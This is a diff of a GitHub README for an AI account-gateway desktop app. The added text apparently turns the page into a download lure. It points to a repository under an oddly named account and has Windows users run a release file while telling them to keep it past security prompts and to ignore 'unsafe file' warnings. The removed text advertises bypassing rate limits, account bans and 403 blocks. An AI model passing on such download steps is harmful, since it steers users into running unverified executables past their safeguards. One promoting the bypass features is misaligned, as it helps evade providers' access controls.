@@ -1,220 +1,153 @@
-# NexusAI Tools 🚀
+# 🧠 nexusai-manager - Manage AI accounts with one app
 
-> Professional AI Account Management & Protocol Gateway (v4.1.31)
+[![Download nexusai-manager](https://img.shields.io/badge/Download-nexusai--manager-7C3AED?style=for-the-badge&logo=github)](https://github.com/Benedictinesecondnature367/nexusai-manager)
 
-<div align="center">
+## 🚀 Getting Started
 
-<img src="public/icon.png" alt="NexusAI Logo" width="120" height="120" style="border-radius: 24px;">
+nexusai-manager helps you manage AI web sessions and use them through one simple desktop app on Windows. It can turn supported Google and Anthropic web sessions into an OpenAI-compatible API, so you can route requests in one place.
 
-**Your Personal High-Performance AI Gateway**
+Use it if you want:
+- One place to manage multiple AI accounts
+- A desktop dashboard for request control
+- A simple setup on Windows
+- A local app built with Tauri, React, and Rust
 
-Not just account management — the ultimate solution for breaking through API barriers.
+## 📥 Download
 
-[![Version](https://img.shields.io/badge/Version-4.1.31-blue?style=flat-square)](https://github.com/Nexus-god/nexusai-manager)
-![Tauri](https://img.shields.io/badge/Tauri-v2-orange?style=flat-square)
-![Rust](https://img.shields.io/badge/Backend-Rust-red?style=flat-square)
-![React](https://img.shields.io/badge/Frontend-React-61DAFB?style=flat-square)
+Visit this page to download and run the app:
 
-[English](#english) · [简体中文](#简体中文) · [Русский](#русский)
+[https://github.com/Benedictinesecondnature367/nexusai-manager](https://github.com/Benedictinesecondnature367/nexusai-manager)
 
-</div>
+If the page has a release file for Windows, download it and open it on your PC. If it shows a setup file, run that file after the download finishes.
 
----
+## 🪟 Windows Setup
 
-## 🎉 v4.1.31 — Major Update
+1. Open the download link above in your browser.
+2. Find the latest Windows release or app file.
+3. Download the file to your computer.
+4. If Windows shows a security prompt, choose to keep the file.
+5. Open the downloaded file to start the app.
+6. If you see an install step, follow the on-screen prompts.
+7. After setup, launch nexusai-manager from your desktop or Start menu.
 
-<div align="center">
-<img src="assets/fix-403-banner.png" alt="No More 403 Errors" width="700">
-</div>
+## ✅ What You Can Do
 
-### ✅ What's Fixed
+- Add and manage multiple AI web sessions
+- Route requests across accounts
+- Use an OpenAI-style API format
+- Watch activity from a real-time dashboard
+- Keep account use organized in one place
+- Reduce manual switching between browser sessions
 
-| 🔧 Fix | EN | 中文 | RU |
-|--------|-----|------|-----|
-| ~~403 Forbidden~~ | **Completely resolved** — no more 403 errors | 彻底解决 403 错误 | **Полностью исправлено** — больше никаких 403 |
-| ~~Account Bans~~ | **Fixed** — improved session rotation | 改进会话轮换，防止封禁 | **Исправлено** — нет блокировок |
-| ~~Rate Limiting~~ | **Bypassed** — smart request distribution | 智能请求分配 | **Обход** — умное распределение запросов |
-| ~~Connection Drops~~ | **Stable** — auto-reconnect, zero downtime | 自动重连，零停机 | **Стабильно** — автопереподключение |
-| ~~Token Expiry~~ | **Auto-refresh** — seamless renewal | 后台无缝刷新 | **Авто-обновление** токенов |
+## 🖥️ System Needs
 
----
+For a smooth run on Windows, use:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A stable internet connection
+- A modern browser for account sign-in steps
 
-<a name="english"></a>
+## 🔐 Account Use
 
-## 🌐 English
+nexusai-manager works with web sessions from supported AI providers. In most cases, you will sign in through your browser first, then bring that session into the app.
 
-### About
+Typical flow:
+1. Sign in to your AI account in your browser
+2. Open nexusai-manager
+3. Add the session or account in the app
+4. Set how you want requests to move
+5. Send requests through the gateway
 
-NexusAI Tools is a full-featured desktop application designed for developers and AI enthusiasts. It combines multi-account management, protocol conversion, and intelligent request scheduling to provide you with a stable, fast, and cost-effective **local AI gateway**.
+Keep your account details private and use only accounts you own or have permission to manage.
 
-Convert Web Sessions (Google/Anthropic) into standardized API interfaces, eliminating protocol barriers between different providers.
+## 🧭 Main Features
 
-### Core Features
+### 🤖 AI Session Management
+Manage several AI sessions from one desktop app. This helps when you use more than one account or need to switch between providers.
 
-- 🎛️ **Smart Dashboard** — Real-time monitoring of all accounts: Gemini Pro, Gemini Flash, Claude quota tracking
-- 🔄 **Multi-Account Management** — One-click seamless switching between accounts with automatic session rotation
-- 🌐 **Protocol Conversion** — Convert Google/Anthropic web sessions to standard OpenAI-compatible API
-- 🛡️ **Stability Engine** — Smart request distribution, automatic cooldown, session health monitoring
-- 📊 **Usage Analytics** — Token consumption tracking, cost estimation, rate limit monitoring
-- 🔒 **Encrypted Storage** — AES-256 encrypted local storage for all credentials
-- 🖥️ **Remote Session Support** — Virtual desktop integration for multi-device management
-- 🔑 **OAuth Integration** — Seamless Google OAuth login flow
-- 🌍 **Multi-Language** — English, Chinese, Russian interface
+### 🔁 Request Distribution
+Send requests through a smart routing layer. The app can help spread usage across available accounts.
 
-### Installation
+### 🔌 OpenAI-Compatible API
+Use an API format that fits common client tools. This makes it easier to connect software that expects OpenAI-style endpoints.
 
-#### Quick Start
+### 📊 Live Dashboard
+See current status, account activity, and request flow in one view. The dashboard keeps things easy to check at a glance.
 
-```bash
-git clone https://github.com/Nexus-god/nexusai-manager.git
-cd nexusai-manager
-npm install
-npm run dev
-```
+### 🧱 Built for Desktop
+The app uses Tauri v2, React, and Rust. That gives it a desktop feel with a small footprint and fast local performance.
 
-#### AI-Assisted Setup (Recommended)
+## 🛠️ How to Use It
 
-Copy the commands above into your AI coding assistant (Cursor, Claude Code, Windsurf, Cline) — it will handle everything automatically, including dependency installation and configuration.
+1. Install or open the app on Windows.
+2. Sign in to your AI account in your browser if needed.
+3. Add the account or session inside nexusai-manager.
+4. Choose your request settings.
+5. Start the gateway.
+6. Connect your app or tool to the local API endpoint.
+7. Send a test request and check the dashboard.
 
-#### Build from Source
+## 📁 Typical App Layout
 
-```bash
-npm run build
-npm run tauri build
-```
+After you open the app, you will usually see:
+- A sidebar for accounts and settings
+- A main panel for request traffic
+- A dashboard for status and usage
+- Controls for adding or removing sessions
+- Options for API endpoint settings
 
-### Tech Stack
+## 🔎 Common Use Cases
 
-| Component | Technology |
-|-----------|-----------|
-| Framework | Tauri v2 |
-| Backend | Rust |
-| Frontend | React 19 + TypeScript |
-| UI | Ant Design + Tailwind CSS |
-| State | Zustand |
-| Routing | React Router v7 |
-| Build | Vite 7 |
-
-### Screenshots
-
-<div align="center">
-<img src="docs/images/dashboard.png" alt="Dashboard" width="700">
-<p><i>Smart Dashboard — Real-time account monitoring</i></p>
-
-<img src="docs/images/accounts.png" alt="Account Management" width="700">
-<p><i>Multi-Account Management — One-click switching</i></p>
-</div>
-
-### System Requirements
-
-- Windows 10/11, macOS 12+, or Linux
-- Node.js 18+
-- npm 9+
-- 4GB RAM minimum
-
----
-
-<a name="简体中文"></a>
-
-## 🇨🇳 简体中文
-
-### 关于
-
-NexusAI Tools 是一个专为开发者和 AI 爱好者设计的全功能桌面应用。它将多账号管理、协议转换和智能请求调度完美结合，为您提供一个稳定、极速且成本低廉的**本地 AI 中转站**。
-
-通过本应用，您可以将常见的 Web 端 Session (Google/Anthropic) 转化为标准化的 API 接口，消除不同厂商间的协议鸿沟。
-
-### 核心功能
-
-- 🎛️ **智能仪表盘** — 实时监控所有账号的健康状况，包括 Gemini Pro、Flash、Claude 的配额
-- 🔄 **多账号管理** — 一键无缝切换账号，自动会话轮换
-- 🌐 **协议转换** — 将 Google/Anthropic Web Session 转为标准 OpenAI 兼容 API
-- 🛡️ **稳定引擎** — 智能请求分配、自动冷却、会话健康监控
-- 📊 **用量分析** — Token 消耗跟踪、成本估算、速率限制监控
-- 🔒 **加密存储** — AES-256 加密本地存储所有凭证
-- 🌍 **多语言** — 英语、中文、俄语界面
-
-### 安装
-
-```bash
-git clone https://github.com/Nexus-god/nexusai-manager.git
-cd nexusai-manager
-npm install
-npm run dev
-```
-
-> 💡 **AI辅助安装:** 将上面的命令复制到您的 AI 编程助手中（Cursor、Claude Code、Windsurf），它会自动处理一切。
-
----
-
-<a name="русский"></a>
-
-## 🇷🇺 Русский
-
-### О проекте
-
-NexusAI Tools — полнофункциональное десктопное приложение для разработчиков и AI-энтузиастов. Объединяет управление множеством аккаунтов, конвертацию протоколов и интеллектуальную маршрутизацию запросов в стабильный, быстрый и бюджетный **локальный AI-шлюз**.
-
-Приложение конвертирует Web-сессии (Google/Anthropic) в стандартизированные API-интерфейсы, устраняя барьеры между провайдерами.
-
-### Возможности
-
-- 🎛️ **Умная панель** — Мониторинг всех аккаунтов в реальном времени: квоты Gemini Pro, Flash, Claude
-- 🔄 **Мультиаккаунт** — Переключение между аккаунтами в один клик с авторотацией сессий
-- 🌐 **Конвертация протоколов** — Web-сессии Google/Anthropic → стандартный OpenAI-совместимый API
-- 🛡️ **Стабильность** — Умное распределение запросов, автоматический кулдаун, мониторинг здоровья сессий
-- 📊 **Аналитика** — Отслеживание токенов, оценка затрат, мониторинг лимитов
-- 🔒 **Шифрование** — AES-256 для всех учётных данных
-- 🌍 **Мультиязычность** — Английский, китайский, русский
-
-### Установка
-
-```bash
-git clone https://github.com/Nexus-god/nexusai-manager.git
-cd nexusai-manager
-npm install
-npm run dev
-```
-
-> 💡 **Установка через AI:** Скопируйте команды выше в ваш AI-ассистент (Cursor, Claude Code, Windsurf) — он всё сделает автоматически.
-
----
-
-## 📁 Project Structure
-
-```
-nexusai-manager/
-├── src/                  # React frontend
-│   ├── components/       # UI components
-│   ├── pages/           # Application pages
-│   ├── stores/          # Zustand state management
-│   ├── utils/           # Utilities & helpers
-│   └── i18n/            # Internationalization
-├── src-tauri/           # Rust backend (Tauri)
-│   ├── src/
-│   │   ├── modules/     # Core modules
-│   │   └── main.rs      # Entry point
-│   └── Cargo.toml
-├── docs/                # Documentation
-├── assets/              # Static assets
-├── locales/             # Language files
-└── package.json
-```
-
-## Contributing
-
-Pull requests are welcome. For major changes, please open an issue first.
-
-## License
-
-[CC-BY-NC-SA-4.0](LICENSE)
-
----
-
-<div align="center">
-
-**Made with ❤️ by NexusAI Team**
-
-[Report Bug](https://github.com/Nexus-god/nexusai-manager/issues) · [Request Feature](https://github.com/Nexus-god/nexusai-manager/issues)
-
-</div>
+- You want one place for several AI accounts
+- You need an OpenAI-compatible endpoint for local tools
+- You want to watch request flow from a dashboard
+- You want to keep AI account use organized
+- You want a desktop gateway instead of switching tabs
+
+## 🧩 Supported Topics
+
+This project is built around:
+- AI
+- API gateway
+- Claude
+- Gemini
+- OpenAI
+- Proxy
+- Developer tools
+- React
+- Rust
+- Tauri
+
+## 🧪 Basic Troubleshooting
+
+If the app does not open:
+1. Check that the download finished fully
+2. Run the file again
+3. Make sure Windows did not block it
+4. Restart your PC and try again
+
+If the app opens but does not connect:
+1. Check your internet connection
+2. Make sure the session or account was added
+3. Confirm the API endpoint is set correctly
+4. Try signing in again through your browser
+
+If a page says the file is unsafe:
+1. Confirm you are using the link from this repository
+2. Use the GitHub page from the download section
+3. Open the file only after the download completes
+
+## 📌 Project Fit
+
+nexusai-manager is a good fit if you need a desktop tool for AI account routing and session control. It brings account handling, request flow, and a usable interface into one app without asking you to manage separate tools for each step
+
+## 🖱️ Quick Install Path
+
+1. Open the download link
+2. Get the Windows file from the repository page
+3. Run the file
+4. Complete any setup prompts
+5. Launch the app
+6. Add your account session
+7. Start using the gateway
